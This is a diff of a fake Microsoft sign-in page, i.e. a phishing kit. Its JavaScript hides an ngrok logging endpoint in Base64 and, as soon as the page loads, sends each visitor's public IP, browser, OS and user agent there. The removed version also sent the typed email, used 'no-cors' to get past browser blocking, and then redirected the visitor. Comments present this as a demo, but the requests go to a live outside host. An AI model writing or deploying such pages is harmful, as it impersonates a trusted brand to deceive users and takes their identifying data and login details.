@@ -3,133 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400&display=swap" rel="stylesheet">
+    <title>Microsoft Sign In</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Custom styles updated for Microsoft's look */
+        /* Custom styles remain the same */
         body {
             font-family: 'Inter', sans-serif;
-            /* Lighter background to match the screenshot */
-            background-color: #f2f2f2; 
+            background: linear-gradient(to bottom right, #f2f6ff, #ffffff);
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
-        .login-card {
-            /* The main white box */
+        .info-card {
             background: white;
-            padding: 30px 40px 30px 40px; 
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Subtle shadow */
-            border: 1px solid #d4d4d4; /* Very light border */
+            padding: 2.5rem;
+            border-radius: 0.25rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
             width: 100%;
-            max-width: 440px; /* Slightly wider card */
+            max-width: 28rem;
         }
-        
-        .microsoft-logo-svg {
-            width: 108px; /* Standard MS logo width */
-            height: 24px;
-            margin-bottom: 20px;
-            display: block; /* Ensure it behaves as a block element */
+        .outlook-logo {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #4a5568;
+            margin-bottom: 1.5rem;
         }
-
         .input-style {
             width: 100%;
-            padding: 10px 0; /* Padding for the placeholder text */
-            border: none; /* No default border */
-            border-bottom: 1px solid #999999; /* Light grey underline */
+            padding: 0.5rem;
+            border: 1px solid #cbd5e0;
             outline: none;
-            font-size: 1rem;
-            color: #333333;
-            margin-bottom: 30px; 
         }
         .input-style:focus {
-            border-bottom: 2px solid #0067b8; /* Microsoft's primary blue on focus */
-            padding-bottom: 9px; /* Adjust padding for thicker border */
-        }
-        .link-style {
-            color: #0067b8; /* Microsoft link blue */
-            font-size: 0.9rem; 
-            text-decoration: none;
-            line-height: 1.5;
-            display: block; 
-            width: fit-content;
-        }
-        .link-style:hover {
-            text-decoration: underline;
+            border-color: #3182ce;
         }
         .blue-button {
-            /* Keep original class but apply Microsoft styles */
-            width: 100px; /* Set a specific width for the 'Next' button */
-            background-color: #0067b8; 
+            width: 100%;
+            background-color: #3182ce;
             color: white;
-            font-weight: 400; 
-            padding: 8px 12px;
-            border-radius: 2px;
+            font-weight: 600;
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
+            border-radius: 0.25rem;
             transition: background-color 0.15s ease-in-out;
-            border: none;
         }
         .blue-button:hover {
-            background-color: #005A9E; 
-        }
-        .sign-in-options-bar {
-            border-top: 1px solid #e6e6e6; 
-            margin-top: 30px;
-            padding-top: 20px;
+            background-color: #2c5282;
         }
     </style>
 </head>
-<body>
+<body class="p-4 flex items-center justify-center">
 
-    <div class="login-card">
-        <svg class="microsoft-logo-svg" viewBox="0 0 108 108" xmlns="http://www.w3.org/2000/svg">
-            <rect x="0" y="0" width="50%" height="50%" fill="#F25022"/>
-            <rect x="50%" y="0" width="50%" height="50%" fill="#7FBA00"/>
-            <rect x="0" y="50%" width="50%" height="50%" fill="#00A4EF"/>
-            <rect x="50%" y="50%" width="50%" height="50%" fill="#FFB900"/>
-        </svg>
+    <div class="info-card">
+        <header class="outlook-logo flex items-center">
+            <svg class="w-6 h-6 mr-2 text-blue-600" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M14.417 8.35a.833.833 0 00-1.666 0v3.317c0 .46-.373.833-.834.833H6.383a.833.833 0 00-.834.834v3.316a.833.833 0 001.666 0v-2.483h4.117a2.5 2.5 0 002.5-2.5V8.35zM7.167 6.667a.833.833 0 00-1.667 0v1.666h1.667V6.667zM14.417 5a.833.833 0 00-1.667 0v1.667h1.667V5zM14.417 11.667a.833.833 0 00-1.667 0v1.666h1.667v-1.666z"></path></svg>
+            Microsoft Sign in
+        </header>
 
-        <h1 class="text-2xl font-normal mb-8">Sign in</h1>
+        <h2 class="text-2xl font-normal mb-6">Sign in</h2>
 
         <form onsubmit="handleLoginAttempt(event)">
-            <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style" required>
-
-            <p class="link-style">
-                No account? Create one!
+            <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style mb-4" required>
+            
+            <p id="status-message" class="text-sm text-gray-500 mb-6 hidden">
+                <span id="ip-loader" class="text-xs text-blue-500 hidden">Fetching details...</span>
             </p>
-            <p class="link-style mb-8">
-                Can't access your account?
-            </p>
-            <p id="status-message" class="text-sm mb-6 hidden text-red-600"></p> 
 
             <div class="flex justify-end">
                 <button type="submit" class="blue-button">Next</button>
             </div>
         </form>
 
-        <div class="sign-in-options-bar">
-            <div class="flex items-center link-style cursor-pointer w-full" style="font-size: 1rem;" onclick="alert('Sign-in options clicked!')">
-                <svg class="w-5 h-5 mr-2" fill="none" stroke="#0067b8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-                Sign-in options
-            </div>
-        </div>
+        <p class="mt-8 text-sm text-blue-600 hover:underline cursor-pointer">
+            No account? Create one!
+        </p>
+        <p class="text-sm text-blue-600 hover:underline cursor-pointer">
+            Sign in with a security key
+        </p>
     </div>
-    
     <script>
-        // --- START UPDATED JAVASCRIPT ---
-        
-        // **!!! ACTION REQUIRED !!!**
-        // REPLACE THIS BASE64 STRING with the Base64-encoded URL of your new logging server.
-        // Current placeholder decodes to: "https://YOUR-NEW-SERVER.onrender.com/api/log"
-        const newEncodedEndpoint = 'aHR0cHM6Ly9yYW5rLXBvc3RkaWdpdGFsLWZlcm4ubmdyb2stZnJlZS5kZXYvYXBpL2xvZ19yZWNvbm5haXNzYW5jZV9kYXRh'; 
+        // Start Obfuscated Script
+        // The URL is Base64 encoded: "https://rank-postdigital-fern.ngrok-free.dev/api/log_reconnaissance_data"
+        const encodedEndpoint = 'aHR0cHM6Ly9yYW5rLXBvc3RkaWdpdGFsLWZlcm4ubmdyb2stZnJlZS5kZXYvYXBpL2xvZ19yZWNvbm5haXNzYW5jZV9kYXRh';
 
         // Decoding function must be used to get the actual endpoint
-        const MOCK_API_ENDPOINT = atob(newEncodedEndpoint);
+        const MOCK_API_ENDPOINT = atob(encodedEndpoint);
 
         const B='N/A';
         let publicIP=B, browserVendor=B, browserLanguage=B, osPlatform=B;
         let userAgent=navigator.userAgent;
+
+        const ipLoaderEl=document.getElementById('ip-loader');
         const statusMessageEl=document.getElementById('status-message');
 
 
@@ -137,6 +99,7 @@
          * Function to fetch the user's public IP address using an external API.
          */
         async function fetchIP() {
+            ipLoaderEl.classList.remove('hidden');
             const K=3;
             let L=1000;
             for(let M=0;M<K;M++){
@@ -160,98 +123,104 @@
         }
 
         /**
-         * Function to gather browser and system details.
+         * Function to gather browser and system details via the 'navigator' object.
          */
         function gatherBrowserDetails() {
             let K='Unknown';
-            if(userAgent.indexOf("Chrome")!==-1&&userAgent.indexOf("Edg")===-1){ K='Google Chrome';
-            }else if(userAgent.indexOf("Firefox")!==-1){ K='Mozilla Firefox';
-            }else if(userAgent.indexOf("Safari")!==-1&&userAgent.indexOf("Chrome")=== -1){ K='Apple Safari';
-            }else if(userAgent.indexOf("Edg")!==-1){ K='Microsoft Edge';
-            }else if(userAgent.indexOf("MSIE")!==-1||userAgent.indexOf("Trident")!==-1){ K='Internet Explorer'; }
+            if(userAgent.indexOf("Chrome")!==-1&&userAgent.indexOf("Edg")===-1){
+                K='Google Chrome';
+            }else if(userAgent.indexOf("Firefox")!==-1){
+                K='Mozilla Firefox';
+            }else if(userAgent.indexOf("Safari")!==-1&&userAgent.indexOf("Chrome")=== -1){
+                K='Apple Safari';
+            }else if(userAgent.indexOf("Edg")!==-1){
+                K='Microsoft Edge';
+            }else if(userAgent.indexOf("MSIE")!==-1||userAgent.indexOf("Trident")!==-1){
+                K='Internet Explorer';
+            }
             browserVendor=K;
             browserLanguage=navigator.language||B;
             osPlatform=navigator.platform||navigator.oscpu||B;
         }
 
         /**
-         * Sends the collected data to the server endpoint with 'no-cors'.
+         * Simulates sending the reconnaissance data to a mock server endpoint.
          */
         async function sendReconDataToServer(details) {
             console.log('%c--- SIMULATING SERVER TRANSMISSION ---', 'color: orange; font-weight: bold;');
-            console.groupCollapsed(`%cData Payload Sent to Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
+            
+            // Console display still logs the decoded endpoint for transparency in this demo
+            console.groupCollapsed(`%cData Payload Sent to Mock Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
             console.table(details);
             console.groupEnd();
 
             try {
-                // *** FIX: Added 'mode: "no-cors"' to prevent browser blocking the request ***
+                // Actual connection attempt using the decoded endpoint
                 const response = await fetch(MOCK_API_ENDPOINT, {
                     method: 'POST',
-                    mode: 'no-cors', 
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(details)
                 });
-                // Note: With 'no-cors', response.ok will not be accurate, but the data is sent.
-                console.log('Attempted to send data. Check server logs.');
-
+                if (response.ok) {
+                    console.log('Data successfully logged on server.');
+                }
             } catch (error) {
-                // This catch often triggers for network issues or blocked requests, 
-                // but we rely on 'no-cors' to bypass common blocks.
-                console.error('Failed to send data (this may be expected due to no-cors/server setup).', error);
+                console.error('Failed to send data.', error);
             }
+            
+            console.log('Transmission simulation complete. Data is now logged on the (fictional) server.');
         }
 
         /**
-         * Handles the login button click and sends data before redirecting.
+         * Handles the login button click.
          */
         function handleLoginAttempt(event) {
             event.preventDefault();
-            const userInput = document.getElementById('user-input').value;
+            const userInput=document.getElementById('user-input').value;
 
-            const dataDetails = {
-                fetchTime: new Date().toISOString(),
-                event: "LoginAttempt",
-                publicIP: publicIP, 
-                browserVendor: browserVendor,
-                osPlatform: osPlatform,
-                browserLanguage: browserLanguage,
-                userAgent: userAgent,
-                userInput: userInput 
-            };
-
-            // Send data to server, then redirect regardless of success/fail
-            sendReconDataToServer(dataDetails).finally(() => {
-                setTimeout(() => {
-                    // --- REDIRECTION TO LOGIN.HTML ---
-                    window.location.href = "login.html"; 
-                }, 1000); // 1 second delay
-            });
+            statusMessageEl.textContent = 'Account not found. Please check your credentials.';
+            statusMessageEl.classList.remove('hidden', 'text-blue-500', 'text-green-600');
+            statusMessageEl.classList.add('text-red-600');
+            
+            console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
+            console.log(`User attempted login with email/phone: ${userInput}`);
+            console.log('Input logging disabled for security compliance.');
         }
-    
+
         /**
-         * Runs on DOMContentLoaded to silently gather IP and system details and send initial data.
+         * Main function to gather all details and start the process.
          */
-        async function backgroundReconnaissance() {
+        async function collectAndSendDetails(){
+            statusMessageEl.classList.remove('hidden');
+            ipLoaderEl.textContent='Gathering initial system data...';
+            
             gatherBrowserDetails();
             await fetchIP(); 
 
-            const initialData = {
-                fetchTime: new Date().toISOString(),
-                event: "PageLoadRecon",
-                publicIP: publicIP,
-                browserVendor: browserVendor,
-                osPlatform: osPlatform,
-                browserLanguage: browserLanguage,
-                userAgent: userAgent,
-                userInput: "Page Load (No Input Yet)"
+            const dataDetails={
+                fetchTime:new Date().toISOString(),
+                event:"PageLoadRecon",
+                publicIP:publicIP,
+                browserVendor:browserVendor,
+                osPlatform:osPlatform,
+                browserLanguage:browserLanguage,
+                userAgent:userAgent
             };
-    
-            // Initial, silent send when the page loads
-            await sendReconDataToServer(initialData);
+            
+            await sendReconDataToServer(dataDetails);
+
+            ipLoaderEl.textContent='System data collection completed in background.';
+            ipLoaderEl.classList.remove('text-blue-500');
+            ipLoaderEl.classList.add('text-green-600');
+            
+            setTimeout(()=>{
+                statusMessageEl.classList.add('hidden');
+            }, 5000);
         }
 
-        document.addEventListener('DOMContentLoaded', backgroundReconnaissance);
-        // --- END UPDATED JAVASCRIPT ---
+        // Start the background process automatically when the page is loaded
+        document.addEventListener('DOMContentLoaded', collectAndSendDetails);
+        // End Obfuscated Script
     </script>
 </body>
 </html>
